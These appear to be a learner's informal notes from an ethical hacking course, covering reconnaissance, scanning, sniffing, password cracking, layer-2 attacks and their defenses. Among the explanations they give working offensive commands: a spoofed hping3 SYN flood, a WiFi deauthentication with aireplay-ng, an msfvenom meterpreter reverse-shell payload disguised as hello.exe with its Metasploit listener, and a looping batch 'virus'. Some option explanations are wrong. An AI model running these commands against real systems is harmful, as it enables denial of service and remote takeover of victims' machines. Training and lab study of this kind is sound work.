poweroff is a linux command that shuts down the virtual machine or any linux device 

you can change your internet settings by going to etc/netowrk/interfaces or you can do it
graphically 

vulnerability : a weakness in the system 

exploit : a breach of the system cause of a vulnerability 

payload : the component of an attack that is used to laucnh it 

zero-day attack : is an attack that has no patch from the developer and was never discoverd
before 

pivoting or daisy chaining : is gaining knowledge or info about some other network or device
from an exisiting hacked device 

doxing : is publishing info about somene online 

bot : is a program that is controlled online to perform a specific task 

infosec : stands for info security and it's accomplished using CIA 

CIA : Confidentiality "only people who are allowed to see the data sees the data " like encryption
Integerity "the trueness of the data like it wasn't manipulated" , non-repudiation " means that every access should be recorded"
Availaibility "meaning availaible to the users"

attack starters or methods : 
APT : advanced presistent threat which is an application or an attack that has been taking
a long time to develop and grow like stuxnet worm

botnet : means a network of bots that are used for a specific functionality like DOS 

insider attack : means an attack coming from the inside

mobile threats : are attacks done through mobiles 

things that attacks take leverage of : 
operating system , misconfiguration , application level : which means attacking a company's 
application to take it over like shrinkwrap where the original settings are the same as 
they came out of the box 

the 5 phases of any attack :
reconnaissance : which means collecting data in a passive or active way which means that
we either come in contact with the target or we not 

scanning : after reconnaissance we scan the info that we gathered for open ports or bad
vulnarbilities etc...

gaining access : which is by taking control of any part of the target like a computer in 
the company , an account on the website and so on 
and the sole purpose of this is then to escalate this access to have higher one 

maintaining access : is to keep this access in place at any given time and to do that 
hackers may plant backdoors to maintain this access 

cleaning tracks : means removing tracks of what the hacker did 

RECO :
www.archive.org : shows you all the previous websites in any dates

www.anywho.com : finds info about people but not in egypt 

www.netcraft.com : find a lot of info about a website 

you can set alerts about websites on google 

the - operator in a search excludes a result from the search results on google

"something" explicitly shows you results that has the word something in it 

you can go into google settings and do an advanced search

site:amazon : shows you only results in amazon 

cache:website : shows you the cached version of a website 

info:website : shows you a lot of info about a specific website 
 
related:website : shows you info that is related to the url you typed 

HTTRACK : takes a whole copy of the website offline analysation

firebug : a tool that shows you the source HTML for a website

webextractor : can collect all the data you need from a given website

metagoofil : a tool that uses google search and download any type of documents that you 
would like to have from a specific website 

email tracker pro : tracks all the email info based on it's headers

whois : is a tool that allows you to find more about a website using kali terminal 

nslookup : shows you the ip address of the website 
set type=mx shows you the mail exechange mail servers

scanning:
the purpose of scanning in general is to find live devices , os , ips in use
ports (open/close)
vulnerabilities

nmap : is a tool used to scan all the open ports of devices on a network 
nmap -sn 192.168.1.0/24 scans the network for availaible devices using arp messages

banner grapping : is a way to discover the type of operating system in use

we discover ports that are open either by using the tcp 3 way handshake or using the UDP

if we send the server an ACK request and it replys with RST that means that there is no 
firewall 

if we send a UDP message and we recive back no response that means that the service isn't 
up on the server

the reason why we are searching for open ports is to leverage them in an unexcepected way

nmap -Pn -sI 192.168.1.216 192.168.1.212
-Pn usually nmap bings the device before it scans the ports this will skip the binging 
process  
-sI idle scanning
192.168.1.216 the zombie that is going to do the scan 
192.168.1.212 the target that is going to be scanned 
the whole idea is to not interact with the target directly and use the zombie to do the 
work

nmap is a tool that shows you the open ports of the system and it's operating system
and maybe it's version 

nmap 192.168.1.* that shows you all the devices in this network 

nmap -sP 192.168.1.* : is a ping scan that scans the whole network and finds out who 
replys back with ping messages 

nmap -sS -p0 -sV -o 192.168.1.1 : 
sS stand for a tcp scan using SYN request 
pO stands for port number scan 
sV stands for searching for pc's operating system version number 
o shows you the operating system of the host

nmap --top-ports 20 192.168.1.0/24:
that scans for a specific number of ports and in our case it's 20 ports 

nmap -sT -p80 192.168.1.* : that will scan for the port 80 on all of the ip addresses 
available in the network 

nmap -sS 192.168.1.1 -D 192.168.1.200 :
this will do the nmap by Decoying 192.168.1.200 

nmap -F 192.168.1.0/24 --exclude 192.168.1.1 , 192.168.1.2 :
-F means it will scan the top 100 ports that are popular 
--execlude means that it will scan those hosts 

nmap --script=default 192.168.1.24: 
this uses the default script to get you more info on a target host

nmap --script=dos 192.168.1.20 : 
this does a dos attack i guess

nmap --script "safe or default" 192.168.1.24 :
runs both of the scripts 

SCAPPY : helps us craft any kind of packet we want 
send(IP(src="192.168.1.212",dst="192.168.1.1")/ICMP()/'OUR SHIT') : 
sends an icmp message from 192.168.1.212 to destination 192.168.1.1 with content of 
our shit

l2=Ether()
l3=IP()
l4=TCP()
l3=Ether(src="00:11:22:33:44:55") or l3.src="whatever"
l4=IP(ttl=99,src="192.168.1.1")
this creates three variables with values as ether , ip and tcp and then it changes their
arguments later
if you want to show the arguments do this 
l2 and then press enter it shows you all the values of the arguments in the l2

sniff(iface="eth0",prn=lambda x: x.show())
this shows you all the packets paasing by in your network 

sniff(filter="host 192.168.1.1",count=5)
this filter the output to be only from the source ip of the host 

hping3 : is used for identifying online devices that aren't replying to pings 

hping3 -S 192.168.1.1 -p 80 -c 2 :
-S sync request 
destination
-p 80 port 80 
-p ++50 start from port 50 
-c 2 do it two times 

hping3 --icmp-ts -1 -c 3 192.168.1.200:
that is send a time stamp request for the following host 
-1 means to default the ping request to be icmp()
-2 for udp for example 
hping3 -2 -p 80 -c 2 192.168.1.200

FLOOODDDDDINNGGGGG ATAAAAAACKKKK
presentation 
hping3 -S -p 80 --flood -a 192.168.1.8 192.168.1.212
-a spoofed ip address 
--flood attack it by flooding it 
show the attack on the windows 8

nmap -A : shows you a detailed sheet of the operating system running on a host 

NESSUS : scans a system for vulunerability 

proxy workbench is a proxy service that is installed to allow hosts to act as a proxy 


enumeration : is gaining more info from devices inside a network to help gain more access

snmp : simple network managment protocol which used on firewalls for protection but it's
generally week and has to be secured 

netBIOS : network Basic Input Output System and what it does is that back in the day 
it used to do the job of the DNS to resolve the ip addresses to websites

snmp uses UDP and uses ports 161/162

metasploit:
search snmp : finds all snmp tools in metasploit 

LDAP is on port 389 and it's used when there is an active directory and that means 
a single database on a computer for all other computers

NTP : Network Time Protocol

SYSTEM HACKING STEPS :
gaining access 
excalating privileges 
executing applications 
hiding files 
covering tracks 

ganning access:
BYPASS CONTROLS "which is going to be done by bypassing user name and a password combination
and that is done using one of the following methods
non-electronic attacks "which could be done by shoulder surfing or social engineering "
active online attacks "going to the website and trying every password combinatino possible"
passsive online attacks "if the host is going to another website like http or ftp and using those
credintials we could sniff the packets using MTM"
offline attacks "which includes taking the database of the hashes and comparing it to 
a rainbow table "

escalaiting privileges : 
by using a design flaw in the system and escalate the rights of the user that we already 
have 

maintaining access:
by executing applications like backdoors , keyloggers and remote access applications
that ensure that even if our access got lost we will still be able to retrieve info 

hiding files :
maybe using tool kits that hide the files deep in the system that average antiviruses cann't
detect it

covering tracks : 
 by hiding the logs either by deleting it or by turning the whole capibility of log recording 
off

PASSWORD CRACKING OVERVIEW :
dictionary vs brute forcing : dictionary is a list of words that the hacker is trying 
againist the system itself 
brute forcing is trying every combination possible for a password 
hybird attack is a combination of brute and dictionary attacks 

rainbow tables are big table of hashes 

sniffing or mitm : using wireshark to sniff packets 

steganography : which is putting malwares and trojans inside of a media file 


aireplay-ng -0 0 -a "bssid here" wlan0 : deathunticates everyone bitcchh!
aircrack-ng OURFILE.cap -w Desktop/wordlist : this compares our file with the passcode list


cain and abel : is a tool usef for man in the middle attack 

ARP poising routing "apr": is used for MITM attacks where it spoofs the mack addresses of devices 
to trick two hosts communicating with each other to send their trafic to a third host
between them 

rainbow table attack : is an attack that takes a password hash and compares it to other 
hashes 

daaaaaaaaaaaaaa
presentation 
chntpw : change NT passwrod , is a way to crack any password on an operating sytem
it requires physical access to the pc 
BIOS to be able to boot CD or usb
then modify the sam user 
use the older version 
write the name in decimal 0x3e9 for example

yersinia is an attack that cause DHCP starvation

presentation 
gaining remote access to another device 
info : if a device initiated a connection the firewall allows for the reply to come back
in 
so in order to be able to connect to the victim freely we have to make it initiate the 
connnection 
by 
create the payload 
put the payload on a server 
the victim executes it and builds the connection 
the tool that creates payloads is called msfvenom 
if you want to view the tools that you are able to craft then do msfvenom --list payloads

CREATING THE PAYLOAD:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 --format=exe >hello.exe
-p is the type of the payload 
LHOST : is the ip address that the victim is going to be connecting to 
LPORT : same as LHOST
--format : which is the format of the file 
> hello.exe is the file that the victim is going to see 


HOSTING THE PAYLOAD ON A SERVER :
service apache2 start 
we want to copy our attack file to the host of the server 
at var www hml and then put the file there 
our server has to be listening to the connection initiated by the victim so 
we are going to open the port by 
running msfconsole 
if the data base isn't working run msfdb run 
use exploit/multi/handler : allows us to use the exploit that we spereatly created 
set LHOST 192.168.1.1 : allows the victim to connect to our server 
set LPORT 1234 : ALLOWS victim to cnnect to our port 
set payload windows/meterpreter/reverse_tcp : that allows it to detect the type of the 
payload 
show options : allows us to see what we have cofigured 
exploit -j -z : to allow multiple sessions to connect to our server 
session -i to show your session 
session -i 1 to connect to the first session 

video 53:
ADS : alternate data streams 
for example when you have the proprties of a file you don't open two files 
you only open one and the other is opened automatically opened with the first one 
we can use that to run and associate excutables

malware : stands for malicious software

video 58 :
wrapping is binging malicious code in an unsuspicous code 
vnc : virtual network computing that allows another computer control over network connection
RAT : remote access trojan that uses VNC technology and control an unauthorised pc 
DDNS : that allows for new ip addresses to be allocated to the same name server that you 
have 
covert : is the term used for misusing protocols for unauthorised usage

set : social engineering toolkit is a kali linux tool for creating trojans 

video 60 : 
virus : it's a program that replicates itself very fast and causes infection for pcs 
it can transform it's signature to avoid being detected by antiviruses 
a virus can use encryption 
they can alter or change data 
a virus waits for user interaction to replicate itself and a worm replicates itself without
user interaction 

viruse stages :
1- design 
2- replication 
3- activation /launch 
4- detection 
5- adds the signature of the virus to the data base software

types of viruses
boot sector  : an MBR is called Master Boot Record that allows for the hard drive to bootup
if the viruse affects the MBR then the viruse loads first before anything else 

rootkits : they put themselves on the MBR 

stealth or tunneling : that is a virus that tricks the antivirus into scanning something 
else other than itself so the antivirus can't find it 

polymorphic : is a virus that changes itself upon scanning and it uses an engine for that 
so it's very hard to be detected by traditional antiviruses 

cavity virus : it takes files and destroys their content and fills the file with null bytes
that the file has the same size but it's content is destroyed 

presentation:
you can simply in a text document wright a virus like this 
@echo off 
:loop
start
start www.google.com
goto :loop


video 64: 

md5sum file.zip "for example" : generates a hash for the file.zip to know if it's untouched
or not 

video 65: 

promiscuous mode : is a mode for the network interface card that allows it to recieve 
any frame even if it'sn't destined to itself and doesn't have a MAC address 

there are two types of sniffing 

passive : is when there is a very old technology used like a hub and the packets are 
forwarded to every other port so when a hacker put his network card in promiscuous mode
that is called passive sniffing 

active sniffing : is when there is a switch used for example and every packet is sent only
to it's specific destination 

mac flooding : is an example of an active sniffing attack that forward a lot of spoofed
mac addresses that make the switch drops CAM table and starts forwarding packets to every
port 

DHCP attacks : is where the hacker suggests itself as a server and a default getway 
so packets will be forwarded to the hacker and it will be a man in the middle attack

arp poising : is where an infected pc thinks that the layer2 address of the gateway is 
the attackers address and then the attacker will be the gateway of the infected device 

DNS poisining  : is where the DNS server is attacked and then it resolves the addresses 
to the hacker which allows him to be able to sniff the data 

winpcap : is a software that allows network cards that are in promiscious mode to analayse
data that isn't meant for them 

video 66 : 

CAM table overflow attack : any device that is connected to the network can send thousands
of spoofed mac address which is going to drop the cam table stored in the switch and that
will cause the switch to deal with every packet as an unknown packet and forward it to 
every port which allows the hacket to spy on conversations between devices on the switch 

the CAM overflow attacks is defended by port security and having a limit for the number of
MAC addresses that every port can learn 
and the actions taken after the violation of ports 
is 
protect : which is to drop every mac address after the limit but it doesn't notify anyone 
restrict : same as protect but with notifications 
shutdown : shuts down the port when it exceeds the limit and notifications are sent 
and it's the default violation behaviour 
shutdown vlan : is the the as shutdown but for vlans 


video 67 :

the steps that are required for gaining an ip address are 
d stands for Discover packet , done by the client	
o offer packet that is done by the DHCP server 
r reply packet done by the client 
a acknowledge which is done by the DHCP 

rouge DHCP server attack steps:

connect a device to the switch and then cause dhcp startvation 

then the connected device will act as a DHCP server and all the newly connected devices
are going to use it as a dhcp server and then all the packets coming out of the switch 
will be forwarded to the attackers device and it will be a valid MITM  attack 

remember to take the wireshark course
 
DHCP snooping : is a security protocol on ports that doesn't allow for DHCP messages to 
be sent in any port by not allowing any device to do a DHCP offer or DHCP acknowlegdgment 
video 68:

gratuitous ARP : is an ARP that is sent but was not required from the sender and 
it has the senders layer 2 address 

proxy arp : is when a device is responding in behalf of another device 

ARP poisining : is done by send a gratuitous arp from the attacker to the default 
gateway telling that the victims pc's macaddress is the attackers mac address and 
send the victim a gratuitous arp that tells it that the gateways mac address is the 
attacker's mac address so it would be a MITM attack 

ARP inspection : is used to compare the original mac address of the device to the 
arp payload of the arp message that the device is sending to detect wether the arp message
is true or not using the dhcp snooping table 

video 70 :
volumetric attack is a ddos attack that counsumes all the resources the available from the 
botnet

fragmentation attacks: are when the server is tryping to reassemble defragmented packets

tcp-state attacks : where a syn request is sent and holds resources from the replying server

video 71 :

network layer session hijacking is spoofing the mac and ip addresses to trick something
into beleiving that we are someone else

application layer session hijacking : is tricking an app into beleiving that we are someone
we are not
